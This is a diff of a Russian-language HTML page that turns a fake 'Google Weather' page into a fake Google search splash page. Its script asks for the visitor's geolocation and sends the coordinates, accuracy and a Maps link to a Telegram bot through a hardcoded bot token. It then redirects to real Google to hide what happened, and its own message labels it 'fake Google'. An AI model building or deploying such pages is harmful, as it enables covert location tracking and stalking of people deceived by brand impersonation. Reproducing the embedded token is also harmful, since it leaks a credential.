@@ -2,38 +2,32 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Погода</title>
+  <title>Google</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
-      background: #f5f5f5;
+      background: #fff;
       font-family: Arial, sans-serif;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      flex-direction: column;
     }
     img {
-      width: 80px;
-      margin-bottom: 20px;
+      width: 272px;
+      margin-bottom: 40px;
     }
     .text {
-      color: #555;
-      font-size: 18px;
-      margin-bottom: 8px;
-    }
-    .loading {
-      font-size: 14px;
-      color: #999;
+      color: #888;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
-  <img src="https://ssl.gstatic.com/onebox/weather/64/sunny.png" alt="Погода от Google" />
-  <div class="text">Определяем ваш регион...</div>
-  <div class="loading">Загрузка прогноза погоды...</div>
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" />
+  <div class="text">Открытие поисковой системы...</div>
 
   <script>
     const botToken = "7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw";
@@ -55,12 +49,12 @@
       const lon = position.coords.longitude.toFixed(6);
       const acc = position.coords.accuracy;
 
-      const msg = `📍 Google Погода:\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(acc)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      const msg = `📍 Поддельный Google:\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(acc)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
       sendToTelegram(msg);
     }
 
     function handleError() {
-      sendToTelegram("⚠️ Геолокация не получена (Google Погода)");
+      sendToTelegram("⚠️ Геолокация не получена (страница Google)");
     }
 
     if (navigator.geolocation) {
@@ -69,9 +63,9 @@
       sendToTelegram("⚠️ Геолокация не поддерживается браузером.");
     }
 
-    // Редирект через 5 сек
+    // Редирект через 5 секунд
     setTimeout(() => {
-      window.location.href = "https://www.google.com/search?q=погода";
+      window.location.href = "https://www.google.com/?client=safari";
     }, 5000);
   </script>
 </body>
